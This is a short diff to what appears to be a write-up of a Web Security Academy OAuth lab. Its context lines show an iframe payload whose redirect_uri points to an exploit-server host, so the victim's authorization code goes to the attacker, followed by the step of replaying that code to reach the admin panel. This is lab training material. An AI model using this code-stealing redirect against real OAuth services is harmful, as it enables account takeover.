@@ -36,6 +36,8 @@ Jesteś zalogowany jako admin/carlos<br>
 
 <br>
 payload
+
+
 <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
 <br>
 
@@ -44,7 +46,7 @@ payload
 
 Log out, and navigate to the following URL, where you’ll be met with the Admin Panel:
 
-
+<br>
 
 https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=CODE
 
